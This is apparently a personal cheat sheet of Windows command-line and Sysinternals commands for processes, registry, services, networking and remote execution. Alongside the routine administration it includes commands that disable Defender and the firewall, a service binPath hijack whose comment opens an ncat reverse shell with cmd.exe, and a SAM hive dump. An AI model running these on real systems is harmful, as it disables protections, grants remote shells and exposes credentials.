# Basic Windows 

- https://learn.microsoft.com/en-us/sysinternals/
- https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands
## Processes

```
tasklist /?
tasklist /fi (username eq myuser) /v /fo table | find "cmd"
tasklist /fo csv

taskkill /pid somepid

wmic process where (ProcessId=<processID>) get Caption,ProcessId,ParentProcessID

pslist /?
pslist -d
pslist -t

pskill
pssuspend
```

## Programs

```
listdlls
listdlls -u # unsigned

set PATH=%PATH%;C:\Users\myuser\Downloads\SysinternalsSuite

dir /s *somefile*
```

### Registry

```
reg /?
reg query hkcu\software\microsoft\windows\currentversion\runonce
reg query hkcu\software\microsoft\windows\currentversion\run
reg delete
reg add hkcu\software\myregistrydirectory /v mykey /t myvaluetype /d myvalue
reg query hklm\path\to\key
reg export hkxx\path\to\key keyfilename

schtasks /?
schtasks /create /tn mytask /sc onstart # on reboot
schtasks /run /i /tn mytast # force run

fsutil
fsutil fsinfo
fsutil fsinfo drives
fsutil fsinfo drivetype c:
fsutil fsinfo volumeinfo c:

systeminternalsuite\du -accepteula c:

dir /r
sysinternalsuite\stream.exe -accepteula

c:\Windows\System32\conhost.exe
```

## System

```
systeminfo /s somehost /u someuser\somedomain /p somepass

set
setx
setx varsystemwide "someprg.exe" /m
```

## Networking

```
ipconfig /all
ipconfig /renew "myadapter"

netstat -ano
arp -s
route print
ping -n
tracert
pathping
```

### Shares

```
nbtstat /n # netBios ports 135, 138, 139
nslookup

net share
net share mysharename=c:\my\share\dir
net use
net use f: \\hostnameorip\dir /user:someuser /persistent:no
```

### Remote connexions

```
nc -s ipaddr -l -n -v -p portnum # listener
nc ipaddr portnum # open connection
socat

psexec -i \\remotecomputer cmd /c "somecommandtorunontheremote"
psexec -i \\remotecomputer -s cmd /c "somecommandtorunontheremote" # system privileges
psexec -i \\remotepc -u user -p pass cmd # interactive connexion
```

## Firewall

### Profiles

```
netsh advfirewall show allprofiles
netsh advfirewall set ?
netsh advfirewall add rule ?
```

### Deactivate 

In PowerShell:
```
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIDAVProtection $true
netsh advfirewall set allprofiles state off
```

## Services

```
sc start WSearch

tasklist /svc # list all services
sc query someservice # query one
sc qc someservice
PsService.exe query WSearch
PsService.exe config WSearch
net stop WSearch
net start WSearch
sc config WSearch start=auto
psservice config WSearch

psservice setconfig someservice auto
sc config someservice binPath="c:\hacked\binary.exe" # "ncat.exe 192.168.1.1 4444 -e cmd.exe"
```

## LDAP

```
Get-ADObject -LDAPFilter '(&(objectClass=organizationalUnit)(!(OU=Domain Controllers)))'
```

## AD

```
reg save HKLM\sam c:\temp\samfile
```
